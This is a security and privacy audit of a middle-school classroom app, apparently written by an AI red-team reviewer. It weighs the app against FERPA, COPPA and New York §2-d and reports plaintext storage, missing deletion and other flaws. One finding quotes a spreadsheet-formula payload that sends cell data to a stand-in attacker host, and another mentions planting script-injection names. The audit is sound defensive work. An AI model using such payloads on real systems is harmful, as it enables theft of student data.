# BOW Decision Challenges — Security & Privacy Vendor Review

**Reviewer role:** fresh-context red team, read-only except this file and `gauntlet/receipts/vendor/`.
**Date:** 2026-08-18. **Branch:** `claude/bow-decision-challenges-gauntlet-pg1522`.
**Question I was asked to answer:** is there a reason a US school district should refuse to deploy this to middle-schoolers?

**How I tested.** I read `server/{crypto,identity,handler,store,index}.ts`, `api/[[...route]].ts`,
`src/platform/identity/*`, and the front-end fetch/render paths. I ran a **private** copy of the shipped
server (`node dist-server/index.js`, file store, port **4188**, data under `.scratch/vendor/classes`) and
attacked it with `curl`. I did **not** restart or touch the shared API on :4180. Reproduction transcripts
are saved under `gauntlet/receipts/vendor/`.

---

## Verdict

**DEPLOY WITH CONDITIONS** — with one carve-out: **REFUSE the self-hosted "file store" configuration**
(`npm run api`, the driver a district that won't take a managed key-value store is explicitly offered)
until it encrypts data at rest and actually deletes at the retention horizon.

**Single strongest reason:** As shipped, the durable **file store writes student names, every class's
teacher key, and the token-signing secret in plaintext on disk, and nothing ever deletes expired class
data** — so a self-hosted instance fails two affirmative NY Education Law §2-d / 8 NYCRR Part 121
obligations (encryption "in its custody," executed retention/deletion), and the README's promise that
classes are "kept for 120 days, then deleted" is not true on that driver. This is exactly the failure the
code's own comment condemns ("a retention promise nothing can execute is a sentence in a document rather
than a property of the system," `server/store.ts:106`).

**Why not REFUSE outright.** The data held about a child is genuinely minimal (a teacher-typed first
name + last initial, plus decision evidence — no email, DOB, school, device, or clickstream), the
authorization model is sound and I **could not reproduce any cross-student, cross-teacher, or
unauthenticated disclosure of another child's work or name**, token handling resists the whole `alg:none`/
tamper family, the supply chain is four runtime dependencies with no analytics/CDN/fonts/trackers, and
**no student writing is ever sent to any model — verified, zero outbound calls except the class API.**
Every gap below is a bounded, fixable engineering or contractual item, not an architectural dead end. A
pilot on the managed path (Vercel/Upstash over HTTPS, TTL deletion, a signed DPA) is defensible under the
conditions listed at the end.

**The one thing to fix first:** Make the durable file store meet §2-d before it is handed to any
district — **encrypt PII at rest (and stop storing the session-signing secret and teacher keys in
plaintext beside the data they protect), and run the 120-day deletion the product already advertises.**
Right now a single disk image or nightly backup of a self-hosted box is a full compromise of every class,
forever.

### Severity counts
- **BLOCKER: 1** (at-rest plaintext PII + secrets on the file store — for that deployment path)
- **MAJOR: 4**
- **MINOR: 5**

---

## The obligations that actually bite (researched, with sources)

- **FERPA school-official exception** (34 CFR §99.31(a)(1)): a vendor may hold education records without
  parental consent only as a "school official" performing an outsourced institutional function, **under
  the school's direct control**, using the data only for the authorized purpose and not re-disclosing it.
  BOW's design (district owns the labels; vendor holds `{id, createdAt}` + evidence) fits this shape, but
  the "direct control / use limitation / deletion on request" conditions are contractual and are **not**
  all executable in the product today (see MAJOR-3).
- **COPPA, Rule amended 22 Apr 2025** (16 CFR Part 312): §312.8 now requires a **written information
  security program** (designated personnel, annual risk assessment, safeguards, testing); §312.10 requires
  a **written data-retention policy**, deletion when no longer needed, and states personal information
  "may not be retained indefinitely." School-provided consent for ed-tech remains **FTC guidance, not a
  codified Rule exception** — the school, not the vendor, carries the consent, and it is limited to
  educational, non-commercial use with deletion available. (I could not fully verify the codification
  status from the truncated FTC FAQ; a district should confirm.)
  Sources: [16 CFR 312.8](https://www.law.cornell.edu/cfr/text/16/312.8),
  [16 CFR 312.10](https://www.law.cornell.edu/cfr/text/16/312.10),
  [FTC COPPA FAQ](https://www.ftc.gov/business-guidance/resources/complying-coppa-frequently-asked-questions).
- **NY Education Law §2-d**: a third-party contractor must "use **encryption technology to protect data
  while in motion or in its custody** from unauthorized disclosure," adopt a data-security-and-privacy plan
  with a signed **Parents' Bill of Rights** and staff-training attestation, notify the educational agency
  of a breach "in the most expedient way possible and **without unreasonable delay**," and must not sell
  or use PII for **marketing or any commercial purpose**.
  Source: [NY EDN §2-D](https://www.nysenate.gov/legislation/laws/EDN/2-D).
- **8 NYCRR Part 121**: aligns agencies/contractors to the **NIST Cybersecurity Framework**, requires
  **encryption of PII at rest and in transit**, a data-security-and-privacy plan, and parent notification
  of a breach within **60 days**. (Verbatim section text — §121.5 / §121.9 / §121.10 — could not be
  re-fetched this session: govt.westlaw.com is blocked and the NYSED reg pages did not render; the summary
  here reflects the regulation as established and the district should confirm against the current text.)

> I am not asserting BOW is or is not "compliant." Compliance is a determination the district makes with
> facts I do not have (hosting region, the DPA with the KV subprocessor, the signed Parents' Bill of Rights,
> the deployed retention job). Below I state, obligation by obligation, what the product **does**, what it
> **does not do**, and what **cannot be determined** from the code.

**Credit where due — the product obeys its own rule about not over-claiming.** The README does **not**
claim FERPA/COPPA/§2-d/NYCPS compliance; it says plainly "NYSED has not reviewed or endorsed BOW," and the
identity types spell out the data-minimization posture honestly. The **one** operational over-claim I found
is the retention sentence (MAJOR-2).

---

## (a) What I reproduced

### BLOCKER-1 — PII, teacher keys, and the token-signing secret are stored in plaintext at rest (file store)
**Where:** `server/store.ts` `fileStore()` writes `JSON.stringify(value)` to disk with no encryption.
**Reproduction:** `gauntlet/receipts/vendor/at-rest-plaintext.txt`. On my instance:
- `.bow-classes/<CODE>/class.json` → `"label"` and **`"teacherKey":"6JQYYV9ENRRGATD3TXAX6CT7"`** in cleartext.
  The teacher key alone opens the class for full read/write of every child's evidence
  (`opensClass()` accepts it, `server/identity.ts:158`).
- `.bow-classes/<CODE>/roster/<seat>.json` → **`"displayName"`** (the child's name) in cleartext. Join
  codes, passwords, and recovery codes are correctly scrypt-hashed — the names are not, because a name is
  data, not a credential.
- `.bow-classes/_accounts/session-secret.json` → **the HMAC key every session token is signed with,
  in cleartext.** Anyone who reads this file can forge a valid teacher or student token for anyone.
- `.bow-classes/_accounts/teachers/*.json` → teacher **email** in cleartext (password/recovery hashed).

**What an attacker gets:** one disk image, one stray backup, one restored volume, or one path-traversal
elsewhere on the host = every class's names + evidence, every teacher key, and the ability to mint tokens
for the whole deployment. There is no defense in depth between "read a file" and "own everything."
**Obligation:** §2-d encryption "in its custody"; Part 121 at-rest encryption; COPPA §312.8 written ISP.
**Fix:** Encrypt records at rest (envelope-encrypt values with a KMS/OS-keyring key, or require and document
full-volume encryption as a deployment precondition and refuse to start without it). Move the signing
secret and teacher keys into a secret store, not the data directory. On the **managed** path (Upstash/
Vercel KV) at-rest encryption becomes the subprocessor's control — which converts this into a
**DPA-and-attestation** requirement, not a code fix (MAJOR-4).

### MAJOR-2 — "Kept for 120 days, then deleted" is not executed by the file store; expired child data persists indefinitely
**Where:** `deleteClass()` is the **only** code that removes data, and it is called from exactly one place:
the manual `DELETE /classes/:code` route (`server/handler.ts:392`). There is **no** sweeper, cron, TTL, or
timer for the file store. Reads gate on `expiresAt <= now` and return 404/410 — the data is **hidden, not
deleted**. (The Redis driver does set `EX`/`EXPIRE` TTLs, so it mostly self-deletes student PII; the file
driver does not.)
**Reproduction:** exhaustive grep — `deleteClass` has one caller; no scheduler exists (`server/*`).
**What it means:** a self-hosted district that runs a term of classes accumulates children's names,
submissions, and teacher feedback on disk **forever**, while the product and README both say it is deleted
at day 120. This is the precise contradiction the code comments condemn.
**Obligation:** COPPA §312.10 ("may not be retained indefinitely," written retention policy, deletion when
no longer needed); §2-d/Part 121 retention.
**Fix:** Add a retention job that hard-deletes classes past `expiresAt` (and prunes orphaned account
records); make `GET /health` report last-sweep time; and correct the README so the claim matches the
driver.

### MAJOR-3 — No per-student deletion; a parent's "delete my child's data" can only be met by deleting the whole class
**Where:** `DELETE /classes/:code/roster/:seat` (`server/identity.ts:577`) is a **tombstone** — it sets
`removedAt` and nulls `studentId` but **keeps the `displayName` and every submission/feedback row** the
seat produced. The only hard delete is the whole class.
**Reproduction:** removed seat 1 (Ana); her `displayName` and rows remain on disk; `/me/classes` hides
the class from her but the teacher's export still carries the name.
**What it means:** a district cannot honor a single-child erasure request (FERPA amendment/deletion, COPPA
§312.10, §2-d parent rights) without destroying the other 29 students' work.
**Fix:** Add a route that hard-deletes one seat's name + submissions + feedback + checkpoints while leaving
the rest of the class intact.

### MAJOR-4 — The only third party that ever receives student data is the KV subprocessor, and that requires a DPA the repo cannot show
**Where:** `redisRestStore()` (`server/store.ts:427`) POSTs full class JSON (names, evidence) to
`KV_REST_API_URL` (Upstash/Vercel KV). This is the production/serverless path. Everything else is
same-origin `/api`; I enumerated every outbound call.
**Reproduction:** the built bundle contains **no** external runtime hosts (only doc links reactjs.org /
reactrouter.com / nysed.gov, never called); all `fetch()` targets are `CLASS_API_BASE` (`/api`). Runtime
deps are `react`, `react-dom`, `react-router-dom`, `vite`. No analytics, no Google Fonts, no CDN.
**What cannot be determined:** the **hosting region** of the KV store (data-residency), whether a §2-d
sub-processor DPA exists, and Upstash/Vercel's at-rest attestation. These are contractual.
**Fix:** Name the subprocessor and region in the DPA; or run self-hosted (which removes the third party but
reintroduces BLOCKER-1/MAJOR-2).

### MAJOR-5 — An open-join class accepts anonymous, forged evidence from the class code alone
**Where:** `POST /classes/:code/submissions` requires a student token **only if the class has a roster**
(`server/handler.ts:333`). An open-join class (no pasted list — the default until a teacher pastes one) has
`roster.length === 0`, so submissions are unauthenticated.
**Reproduction:** `gauntlet/receipts/vendor/open-class-forged-submission.txt` — `POST` with no
`Authorization`, `seatCode:"7"`, a valid event log → **202 Accepted**, and it appears in the teacher's
evidence room. Rate-limited to 120/10min per IP; the class code is on a whiteboard.
**What a curious twelve-year-old gets:** the ability to stuff another room's evidence room with fabricated
"submissions" under any seat number, as long as they know the (publicly displayed) code. This is an
**integrity** problem, not a disclosure — but a teacher who grades from a polluted evidence room is the
harm. Roster classes (the recommended default) correctly reject this (403).
**Fix:** Require a session even in open-join, or bind open submissions to the seat's issued join code.

### MINOR-6 — CSV/TSV formula injection via a student-controlled display name into the gradebook export
**Where:** `cleanDisplayName()` strips only control chars; `gradebookTsv()` (`src/educator/gradebook.ts:227`)
neutralizes only `\t\n\r`. Leading `=`, `+`, `-`, `@` survive.
**Reproduction:** `gauntlet/receipts/vendor/formula-injection.txt` — in an open-join class I self-named
`=HYPERLINK("http://evil.example/?"&A1,"grade")`; it is stored verbatim and lands in a gradebook cell.
The teacher's "Copy for a gradebook" → paste into Excel/Sheets = a live formula (data exfiltration on
click; worse in legacy Excel/DDE). Modern spreadsheets warn on paste, which limits it.
**Fix:** Prefix cells beginning `= + - @` with `'` (or wrap in quotes) in `gradebookTsv`.

### MINOR-7 — No Content-Security-Policy or security response headers
**Where:** neither `index.html` nor the API sets CSP, `X-Content-Type-Options`, `X-Frame-Options`, or HSTS.
**Reproduction:** `curl -D-` on `/api/health` shows only CORS headers. React auto-escaping means the stored
`<script>`/`<img onerror>` names I planted are inert (see below), so this is defense-in-depth, not an open
XSS — but a school product should ship a CSP and clickjacking protection.
**Fix:** Add a CSP meta/header and the standard hardening headers.

### MINOR-8 — The token-signing secret is minted from `Math.random()`, not a CSPRNG
**Where:** `fileStore.sessionSecret()` and `redisRestStore.sessionSecret()` derive the secret from
`sha512(Math.random() + Date.now() + pid)` (`server/store.ts:397, 498`). The codebase already knows better —
`crypto.ts` deliberately replaced `Math.random()` with a CSPRNG for class codes/keys for this exact reason.
The signing secret, arguably the most important secret in the system, still uses the weak generator.
**Exploitability:** low (mint-once, never transmitted, hashed; an attacker sees no `Math.random()` outputs
from the process), but the fix is one line and the inconsistency is indefensible in a review.
**Fix:** `randomBytes(32)` (already imported in `crypto.ts`).

### MINOR-9 — Self-hosted transit is plain HTTP with no TLS guidance
**Where:** `npm run api` is `node:http` (`server/index.ts`), cleartext. The README's self-hosting note does
not mention terminating TLS. On Vercel, TLS is handled at the edge; self-hosted, children's names and
evidence cross the network in cleartext unless the district adds a proxy.
**Obligation:** §2-d/Part 121 encryption "in motion."
**Fix:** Document a mandatory TLS terminator (and refuse to bind a non-loopback interface without one).

### MINOR-10 — Retention leaves orphaned account/index records even when a class is deleted
**Where:** `deleteClass()` removes the class dir + seat/teacher indexes but not `_accounts/students/*.json`
or `_accounts/teachers/*.json`. Student records hold no PII (`{id, createdAt}`), so this is minor; teacher
**email** records are never deletable by any route.
**Fix:** Prune orphaned student records on class delete; add a teacher-account close/delete route.

---

## (b) Read in the code, not independently reproduced at scale

- **Token verification is sound.** `readToken` (`server/crypto.ts`) checks the HMAC over the encoded payload
  with a constant-time compare **before** parsing, has one non-negotiable algorithm (no `alg` field to
  trust), and enforces `exp`. I reproduced valid=200 / edited-payload=401 / stripped-signature=401 /
  no-dot=401 (`gauntlet/receipts/vendor/auth-matrix.txt`); the `alg:none` family is structurally impossible
  here. The expiry-window and session-generation revocation I read but did not run out to the horizon.
- **Session revocation** works by a per-account `sessionGeneration` counter compared on every request
  (`callerOf`), so a teacher's "sign out the cart" (`POST /signout`) and password recovery invalidate every
  live token in one write. I reproduced `signout` bumping a student's generation.
- **Cross-tenant isolation** holds on every write/read route I tried: second teacher's token, student token,
  and unauth all get 403 on another class's submissions/feedback/assignments/claim/delete/signout
  (`auth-matrix.txt`). The class **door** (`GET /classes/:code/roster` without the key) returns
  `{label, joinMode}` only — **no names** — which closes the old "class code publishes the roster" hole.
- **Rate limiter is honestly described.** The comments state it is **per-process** ("a serverless
  deployment running four functions allows four windows"), and the code matches: a `Map` in module scope,
  keyed by `(bucket, clientId)`, `clientId` = remote address (or trusted XFF only when `BOW_TRUST_PROXY=1`).
  Join charges **only wrong attempts** (120/10min/class); the 5-char × 25-alphabet space (~9.7M) makes this
  a non-threat even multiplied across instances. The description is accurate; I did not run a multi-instance
  deployment to measure the multiplication.
- **Stored XSS is inert.** Names/labels reach the DOM only as React text children (`{label}`,
  `{displayName}`); there is **zero** `dangerouslySetInnerHTML`/`innerHTML`/`document.write` in `src/`, and
  the only variable `href` is a fixed framework `sourceUrl`, not user input. I planted `<script>` and
  `<img onerror>` names and confirmed they persist as literal text server-side; I did not render them in a
  browser (React escaping is definitive and the sink inventory is empty).
- **`unconfigured` store cannot fail open.** `storeFromEnvironment` returns `unconfiguredStore` on an
  ephemeral-disk host with no managed store; every method throws and `handleApiRequest` returns 503 with
  `blockedReason` before touching data; `/health` reports 503 and `classroomReady:false`. `BOW_CLASS_STORE=
  memory` serves but reports `durable:false`/`classroomReady:false`. I read this exhaustively; I did not
  boot a Vercel-shaped environment.
- **Logging is clean.** The server writes one startup line and nothing per-request; no PII in logs. The
  only error detail returned to a client is a store/`payload too large` message (no PII). Read, not fuzzed.

---

## (c) Could not determine (needs facts the code does not carry)

- **Hosting region / data residency** of the KV subprocessor and of any self-hosted box.
- Whether a **§2-d sub-processor DPA**, signed **Parents' Bill of Rights**, and **staff-training
  attestation** exist — none are in the repo (they are contract artifacts).
- The **production retention configuration** actually deployed (which driver, whether volume encryption is
  on, whether a sweeper runs).
- **Breach-notification process**: the product has no breach-detection or notification mechanism at all;
  meeting §2-d "without unreasonable delay" / Part 121 "60 days" is entirely operational.
- Whether the **teacher key**, printed and copyable, is transmitted or stored anywhere outside the review
  boundary in real use (e.g. a teacher emailing it to themselves).

---

## The district's seven questions, answered from what I found

1. **What personal data about a child?** A teacher-typed label (first name + last initial, or "Table 4"),
   plus decision evidence keyed by `(classCode, seatCode)`. The vendor's own student record is `{id,
   createdAt}` — no email, DOB, school, device, IP, or clickstream. **Genuinely minimal; a real strength.**
2. **Who can see it?** The class's teacher key holder and the owning teacher account (both verified
   isolated). Students see only their own seat. Unauth/other-teacher/other-student are blocked. **Sound.**
3. **How long is it kept?** *Advertised* 120 days. **True on Redis (TTL); false on the file store (never
   deleted).** (MAJOR-2)
4. **Who is it shared with?** Nobody by default. One optional subprocessor (KV) on the managed path;
   **no analytics/ad/model third parties.** No student writing to any model (verified). **Strong.**
5. **What happens on breach?** No detection or notification capability exists in the product — **operational
   gap.** Compounded by plaintext-at-rest (BLOCKER-1). (Cannot determine the district's process.)
6. **Parent asks for it / to delete it?** Full class export exists (`GET /classes/:code/submissions` with
   the key). **Per-child deletion does not** — only whole-class delete. (MAJOR-3)
7. **What if the vendor disappears?** Self-hostable with the same code and a file store — good for
   continuity, but that path carries BLOCKER-1 and MAJOR-2.

---

## Conditions for a DEPLOY (managed path)

1. Run the **managed** driver (Vercel/Upstash) over **HTTPS only**; obtain a §2-d **DPA naming the KV
   subprocessor, its region, and its at-rest-encryption attestation**.
2. **Do not use the file-store / `npm run api` configuration** for real student data until BLOCKER-1 and
   MAJOR-2 are fixed (at-rest encryption + a deletion sweeper).
3. Ship a **per-child deletion** route (MAJOR-3) and confirm the retention job runs (MAJOR-2).
4. Default all classes to **roster** mode; treat open-join as demo-only (MAJOR-5).
5. Neutralize gradebook formula injection (MINOR-6); add CSP + hardening headers (MINOR-7); switch the
   signing secret to a CSPRNG (MINOR-8).
6. Supply the **signed Parents' Bill of Rights, data-security-and-privacy plan, and breach-notification
   procedure** — none exist in the product and all are §2-d/Part 121 prerequisites.

---

## What I did NOT test
- No browser/Playwright rendering pass (React escaping + empty HTML-sink inventory made it unnecessary; the
  XSS conclusion is from code, not a screenshot).
- No multi-instance/serverless deployment, so the per-process rate-limit multiplication is reasoned, not
  measured; no Vercel/Lambda `unconfigured`-store boot.
- No load/timing side-channel analysis of scrypt or the constant-time compare (read as correct).
- No test of the **Redis** driver against a live Upstash endpoint (read only); TTL deletion not observed
  end to end.
- Did not run classes out to the 120-day `expiresAt` horizon; retention behavior is from exhaustive code
  inspection (no sweeper exists), not a wall-clock test.
- Did not fuzz the evidence `log` array for resource exhaustion beyond the documented 5000-event cap, nor
  the 4 MB body limit.
- Did not audit `node_modules` transitive dependencies beyond the 4 declared runtime packages, nor run an
  SCA/`npm audit` scan.
- Could not retrieve verbatim 8 NYCRR Part 121 section text this session (source blocked); relied on the
  established regulation and cited §2-d/COPPA primary text directly.
- Did not exercise password/recovery brute-force to the limiter ceiling, nor email-enumeration timing on
  `/auth/teacher/session` (read as single-shape/single-message, which is correct).
